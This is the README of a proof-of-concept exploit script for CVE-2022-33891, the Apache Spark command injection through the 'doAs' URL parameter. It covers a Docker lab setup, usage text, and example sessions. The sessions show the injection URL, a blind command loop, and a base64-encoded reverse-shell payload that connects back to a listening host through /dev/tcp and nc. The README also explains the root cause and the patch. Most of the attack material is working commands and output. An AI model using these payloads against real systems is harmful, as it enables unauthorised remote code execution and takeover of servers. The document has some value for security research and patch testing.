# CVE-2022-33891
Apache Spark Shell Command Injection Vulnerability

A Python POC for exploiting the Apache Spark Shell Command Injection vulnerability. I saw some other POCs out there but they looked mega sus. This one is clean and simple.

I did not discover this exploit/vulnerability. I just wanted to make a safe POC for the community ^.^

## Affected Versions
Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1

## Vulnerable component
```
http://localhost:8080/?doAs=`[command injection here]`
```
Example
```
http://localhost:8080/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`
```
... sleeps for 10 seconds


## Setup
You need a vulnerable version of Spark that has a single config option changed.

- Install the dependencies: `$ pip3 install -r requirements.txt`
- Change directories into the `spark/` directory.
- Use the provided `docker-compose.yml` in the `spark/` directory and run `docker-compose up`. Let the container spin up.
- In a new terminal, enter `sudo docker exec -it spark_spark_1 /bin/bash`
- In the container bash session, enter: `echo "spark.acls.enable       true" >> conf/spark-defaults.conf`
- Optionally, cat the contents of spark-defaults.conf to make sure it looks good.
- Exit the interactice bash shell and Ctl-C your docker-compose process.
- Once the containers have powered down gracefully, rerun `docker-compose up`


## Usage
```
usage: poc.py [-h] -u URL -p PORT [--revshell] [-lh LISTENINGHOST] [-lp LISTENINGPORT] [--check]

CVE-2022-33891 Python POC Exploit Script

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL to exploit.
  -p PORT, --port PORT  Exploit target's port.
  --revshell            Reverse Shell option.
  -lh LISTENINGHOST, --listeninghost LISTENINGHOST
                        Your listening host IP address.
  -lp LISTENINGPORT, --listeningport LISTENINGPORT
                        Your listening host port.
  --check               Checks if the target is exploitable with a sleep test

```

## Examples

Check to see if the target is vulnerable:
```
husky@dev-kde:~/spark$ python3 poc.py -u http://localhost -p 8080 --check
[*] Attempting to connect to site...
[*] Performing sleep test of 10 seconds...
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2xlZXAgMTA= | base64 -d | bash`
[+] Sleep was 10 seconds! This target is probably vulnerable!
```

Issue commands in a command prompt loop:
```
husky@dev-kde:~/spark$ python3 poc.py -u http://localhost -p 8080
[*] "Interactive" mode!
[!] Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.
> sleep 5
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2xlZXAgNQ== | base64 -d | bash`
> 
```

Execute a reverse shell:
```
husky@dev-kde:~/spark$ python3 poc.py -u http://localhost -p 8080 --revshell -lh 192.168.138.131 -lp 1337
[*] Reverse shell mode.
[*] Set up your listener by entering the following:
 nc -nvlp 1337
[!] When your listener is set up, press enter!
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzguMTMxLzEzMzcgMD4mMQ== | base64 -d | bash`

...[in the other terminal]...

husky@dev-kde:~/spark$ nc -nvlp 1337
Listening on 0.0.0.0 1337
Connection received on 172.21.0.2 55278
sh: 0: can't access tty; job control turned off
$ whoami
spark
```

## More Info
The command injection occurs because Spark checks the group membership of the user passed in the `?doAs` parameter by using a raw Linux command.

Passing in `id` as the user produces this error in the traceback:
```
spark_1  | 22/07/20 11:55:58 INFO Utils: id: 'id': no such user
spark_1  | 22/07/20 11:55:58 ERROR Utils: Process List(bash, -c, id -Gn 'id') exited with code 1: 
spark_1  | 22/07/20 11:55:58 ERROR Utils: Error getting groups for user='id'
spark_1  | org.apache.spark.SparkException: Process List(bash, -c, id -Gn 'id') exited with code 1

```
Here, Java has decided it would be best to pass in the `id` command into `bash -c` to check the group membership for a specified user. Problem is, that also allows command injection.

Patched versions parametrize this call to have a full path to the `/bin/id` command instead of to `bash -c id`

It's worth noting that there is nothing reflected back on the page during command execution, so this is blind OS injection. Your commands run, but there will be no indication if they worked or not or even if the program you're running is on the target. For example, the container that is spun up with the `docker-compose.yml` file in this repo does not have ping, so checking for command injection via a pingback will not work. But you won't know that's the case so you'll be left wondering if it worked or not.

The sleep test is a safe bet ^.^

## References
- https://securityonline.info/cve-2022-33891-apache-spark-shell-command-injection-vulnerability/
- https://nvd.nist.gov/vuln/detail/CVE-2022-33891
- https://spark.apache.org/docs/2.1.0/configuration.html
- https://github.com/W01fh4cker/cve-2022-33891 (I do not recommend using this POC)

